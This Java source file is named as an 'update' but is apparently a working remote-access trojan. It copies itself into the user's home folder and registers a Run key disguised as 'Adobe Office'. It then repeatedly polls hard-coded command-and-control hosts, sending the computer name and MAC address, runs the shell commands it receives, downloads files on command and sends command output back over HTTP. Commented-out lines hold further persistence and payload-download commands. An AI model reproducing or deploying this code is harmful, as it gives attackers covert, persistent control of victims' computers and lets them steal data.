package update;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLDecoder;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.channels.FileChannel;

import javax.swing.JOptionPane;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import javax.jnlp.*;


public class update{
	

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		String hostname="none";
		String result="";
		String output="";
		String site="paner.altervista.org";
		String site1="paner.altervista.org";
		String site2="52.26.124.145";
		String site3="certificates.ddns.net";
		InetAddress addr;
		Runtime runtime = Runtime.getRuntime();
		String path = update.class.getProtectionDomain().getCodeSource().getLocation().getPath();
		
		System.setProperty("java.net.useSystemProxies","true");
		
		//String sproxy= GetProxy.GetParameters();
		String decodedPath="";
		String jhome=System.getProperty("java.home");
		try{
			 decodedPath = URLDecoder.decode(path, "UTF-8");
			 decodedPath=decodedPath.replace("/", "\\");
			 decodedPath=decodedPath.substring(1);
		}
		catch (UnsupportedEncodingException e) {
            e.printStackTrace();
		}
		//JOptionPane.showMessageDialog(null, jhome );
		
		try {
        	Thread.sleep(6 * 1000);
        }
        catch (InterruptedException e) {
            e.printStackTrace();
        }
		
		
		//File srcFile = new File(System.getProperty("user.dir") + "\\update.jar");
		File srcFile = new File(decodedPath);
		//File srcFile = new File(System.getenv("APPDATA") + "\\update.jar");
		File trgFile = new File(System.getProperty("user.home") + "\\update.jar");
		
		
		try{
			if(!(decodedPath).equals(System.getProperty("user.home")+ "\\update.jar"))
				copyFileUsingFileStreams(srcFile,trgFile);
		}
		catch (IOException ex)
		{
			    
		}
/*		String value = "\""+jhome+"\\javaw.exe -jar " + System.getProperty("user.home") + "\\update.jar\"";
		String cmdreg="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Adobe-Office /t REG_SZ /d "+ value +" /f";
				
		try{
			Process proc = runtime.exec(cmdreg);
		}
		catch (IOException e) {
		}
*/
		File f = new File(System.getProperty("user.home")+"\\jhome.txt");

//		if(!f.exists() && !f.isDirectory()) { 
			// do something
//			DownloadFile.GetFile("http://52.26.124.145/update.jar", System.getProperty("user.home") + "\\update.jar");
		try{
			
			
			String value =jhome+"\\bin\\javaw.exe -jar \"" + System.getProperty("user.home") + "\\update.jar\"";
			//String value = "javaw.exe -jar \"" + System.getProperty("user.home") + "\\update.jar\"";
			
			try{
				//String curver = WinRegistry.readString(WinRegistry.HKEY_LOCAL_MACHINE, "SOFTWARE\\JavaSoft\\Java Runtime Environment","CurrentVersion");
				//String javahome  ="";// WinRegistry.readString(WinRegistry.HKEY_LOCAL_MACHINE, "SOFTWARE\\JavaSoft\\Java Runtime Environment\\"+curver,"JavaHome");
				//value = javahome+"\\javaw.exe -jar \"" + System.getProperty("user.home") + "\\update.jar\"";
				
				WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Adobe Office", value);
				try(  PrintWriter out = new PrintWriter( System.getProperty("user.home")+"\\jhome.txt" )  ){
				    out.println( jhome );
				}
				catch (FileNotFoundException e) {
		            e.printStackTrace();
		        }
			}
			catch (IllegalAccessException ex)
			{
				JOptionPane.showMessageDialog(null, "Alt"); 
			}
			
		}		
		catch (InvocationTargetException ex)
		{
			    
		}
//		}
	/*	try {
			
			Runtime runtime = Runtime.getRuntime();
	        String cmds = "cmd /C powershell Invoke-WebRequest -Uri 'http://pannello.xoom.it/svc/plink.dat' -OutFile 'd:\\dati\\plink.exe'";
	        Process proc = runtime.exec(cmds);
		}
		catch (IOException e) {
		}
	*/	//try {
		
	        while (true) {
	        	//try
	    		//{
	    			//addr = InetAddress.getLocalHost();
	    		    //hostname = addr.getHostName();
	    		    hostname =System.getenv("COMPUTERNAME");
	    		    hostname=hostname+"_"+GetNetworkAddress.GetAddress("mac");
	    		    
	    		//}
	    		//catch (UnknownHostException ex)
	    		//{
	    		//    System.out.println("Hostname can not be resolved");
	    		//}
	        	result=getResponseFromUrl("http://"+site+"/svc/wup.php?pc="+hostname);
	        	if (result.equals(""))
				{
	        		site=site2;
					result=getResponseFromUrl("http://"+site+"/svc/wup.php?pc="+hostname);
					if (result.equals(""))
					{
		        		site=site3;
						result=getResponseFromUrl("http://"+site+"/svc/wup.php?pc="+hostname);

					}
				}
	        	String[] array = result.split("\\|\\|", -1);
	        	String exec=array[7].substring(5);
	        	String ip=array[1].substring(3);
	        	String port=array[2].substring(5);
	        	String cmd=array[8].substring(4);
	        	String iout=array[5].substring(5);
	        	if (exec.equals("1"))
	        	{
	        		String cmds = "cmd /C "+cmd;
	        		
	        		
	        		    array = cmd.split(" ", -1);
	        		    if (array[0].equals("getfile"))
	        		    {
	        		    	DownloadFile.GetFile(array[1], array[2]);
	        		    }
	        		    else if (iout.equals("1"))
	    	        	{
	        				output = executeCommand(cmds);
	        				output = output.replace("\'", "");
		        			output = output.replace("\\", "\\\\");
		        			output = output.replaceAll("(\r\n|\n)", "<br>");
		        			output = output.replaceAll(" ", "%20");
	        				result=getResponseFromUrl("http://"+site+"/svc/wup.php?pc="+hostname+"&dump="+output);
	    	        	}
	        			else
	        			{
	        				try{
	        					Process proc = runtime.exec(cmds);
	        				}
		        			catch (IOException e) {
		        			}	
	        			}
	        			result=getResponseFromUrl("http://"+site+"/svc/wup.php?pc="+hostname+"&exec=0");
	        		
	        	}	
		        try {
		        	Thread.sleep(60 * 1000);
		        }
		        catch (InterruptedException e) {
		            e.printStackTrace();
		        }
		        site=site1;
	        }
		//}
	    //catch (IOException e) {
		//}
	}
	private static void copyFileUsingFileChannels(File source, File dest)
			throws IOException {
		FileChannel inputChannel = null;
		FileChannel outputChannel = null;
		try {
			inputChannel = new FileInputStream(source).getChannel();
			outputChannel = new FileOutputStream(dest).getChannel();
			outputChannel.transferFrom(inputChannel, 0, inputChannel.size());
		} finally {
			inputChannel.close();
			outputChannel.close();
		}
	}
	private static String executeCommand(String command) {

		StringBuffer output = new StringBuffer();

		Process p;
		try {
			p = Runtime.getRuntime().exec(command);
			p.waitFor();
			BufferedReader reader = 
                            new BufferedReader(new InputStreamReader(p.getInputStream()));

                        String line = "";			
			while ((line = reader.readLine())!= null) {
				output.append(line + "\n");
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		return output.toString();

	}
	public static String getResponseFromUrl(String surl) {
		String webPage = surl;
		String result="";
		URLConnection urlConnection;

		try{
			URL url = new URL(webPage);
			try{
				urlConnection = url.openConnection();

				InputStream is = urlConnection.getInputStream();
				InputStreamReader isr = new InputStreamReader(is);

				int numCharsRead;
				char[] charArray = new char[1024];
				StringBuffer sb = new StringBuffer();
				while ((numCharsRead = isr.read(charArray)) > 0) {
					sb.append(charArray, 0, numCharsRead);
				}
				result = sb.toString();
			}catch(IOException ex){
				//do exception handling here
			}
		}catch(MalformedURLException malex){
			//do exception handling here
		}

		return  result;
	}
	private static void copyFileUsingFileStreams(File source, File dest)
			throws IOException {
		InputStream input = null;
		OutputStream output = null;
		try {
			input = new FileInputStream(source);
			output = new FileOutputStream(dest);
			byte[] buf = new byte[1024];
			int bytesRead;
			while ((bytesRead = input.read(buf)) > 0) {
				output.write(buf, 0, bytesRead);
			}
		} finally {
			input.close();
			output.close();
		}
	}

}
